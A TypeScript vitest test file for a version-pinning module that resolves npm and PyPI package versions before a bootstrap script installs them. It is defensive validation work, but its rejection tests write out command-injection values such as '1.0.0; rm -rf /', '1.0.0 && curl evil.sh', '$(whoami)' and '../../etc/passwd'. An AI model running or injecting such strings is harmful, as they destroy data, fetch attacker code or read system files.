import { describe, it, expect } from "vitest"

import {
  UNPINNED,
  isPinned,
  isSafeVersion,
  npmSpec,
  parseNpmLatest,
  parsePypiLatest,
  pypiSpec,
  resolveVersion,
} from "./runtime-versions"

/**
 * Pure logic only — no network. The two `resolve*Latest` helpers are thin
 * wrappers over `fetch` and are exercised by `resolveVersion` below via an
 * injected lookup.
 */

describe("isPinned()", () => {
  it("treats the latest sentinel and blanks as unpinned", () => {
    for (const v of [UNPINNED, "", "   ", null, undefined]) {
      expect(isPinned(v)).toBe(false)
    }
  })

  it("treats a concrete version as pinned", () => {
    for (const v of ["2026.9.5", "0.19.0", "0.11.3", " 1.2.3 "]) {
      expect(isPinned(v)).toBe(true)
    }
  })
})

describe("isSafeVersion()", () => {
  // This string is interpolated into a shell command inside the bootstrap, so
  // the character set matters more than the exact versioning scheme.
  it("accepts the schemes the three packages actually publish", () => {
    // openclaw is CalVer, hermes-agent and open-webui are SemVer.
    for (const v of ["2026.9.5", "0.19.0", "0.11.3", "1.0.0-rc.1", "1.2.3+build4"]) {
      expect(isSafeVersion(v)).toBe(true)
    }
  })

  it("rejects anything that could break out of a shell word", () => {
    for (const v of [
      "1.0.0; rm -rf /",
      "1.0.0 && curl evil.sh",
      "$(whoami)",
      "`id`",
      "1.0.0'",
      "../../etc/passwd",
      "latest",
      "",
    ]) {
      expect(isSafeVersion(v)).toBe(false)
    }
  })

  it("rejects an absurdly long version", () => {
    expect(isSafeVersion("1." + "0".repeat(100))).toBe(false)
  })
})

describe("parseNpmLatest()", () => {
  it("reads dist-tags.latest", () => {
    expect(
      parseNpmLatest({ "dist-tags": { latest: "2026.9.5", beta: "2026.9.6" } }),
    ).toBe("2026.9.5")
  })

  it("returns null on a malformed or hostile document", () => {
    for (const body of [
      null,
      undefined,
      "not an object",
      {},
      { "dist-tags": null },
      { "dist-tags": {} },
      { "dist-tags": { latest: 42 } },
      { "dist-tags": { latest: "1.0.0; rm -rf /" } },
    ]) {
      expect(parseNpmLatest(body)).toBeNull()
    }
  })
})

describe("parsePypiLatest()", () => {
  it("reads info.version", () => {
    expect(parsePypiLatest({ info: { version: "0.19.0" } })).toBe("0.19.0")
  })

  it("returns null on a malformed or hostile document", () => {
    for (const body of [
      null,
      "nope",
      {},
      { info: null },
      { info: {} },
      { info: { version: [] } },
      { info: { version: "$(id)" } },
    ]) {
      expect(parsePypiLatest(body)).toBeNull()
    }
  })
})

describe("npmSpec() / pypiSpec()", () => {
  it("pins when a version is known", () => {
    expect(npmSpec("openclaw", "2026.9.5")).toBe("openclaw@2026.9.5")
    expect(pypiSpec("hermes-agent", "0.19.0")).toBe("hermes-agent==0.19.0")
  })

  // An unresolved pin must degrade to exactly what the bootstrap did before
  // pinning existed, never to a failure.
  it("falls back to today's behaviour when unpinned", () => {
    expect(npmSpec("openclaw", null)).toBe("openclaw@latest")
    expect(npmSpec("openclaw", UNPINNED)).toBe("openclaw@latest")
    expect(pypiSpec("open-webui", null)).toBe("open-webui")
    expect(pypiSpec("open-webui", UNPINNED)).toBe("open-webui")
  })
})

describe("resolveVersion()", () => {
  it("lets an explicit env pin win over the registry", async () => {
    // How a bad upstream release is rolled back without a deploy.
    const lookup = async () => "2026.9.5"
    expect(await resolveVersion("2026.9.4", lookup)).toBe("2026.9.4")
  })

  it("goes to the registry only for the latest sentinel", async () => {
    let calls = 0
    const lookup = async () => {
      calls++
      return "0.19.0"
    }
    expect(await resolveVersion(UNPINNED, lookup)).toBe("0.19.0")
    expect(calls).toBe(1)

    await resolveVersion("0.18.2", lookup)
    expect(calls).toBe(1)
  })

  it("returns null when the registry cannot be reached", async () => {
    expect(await resolveVersion(UNPINNED, async () => null)).toBeNull()
  })
})
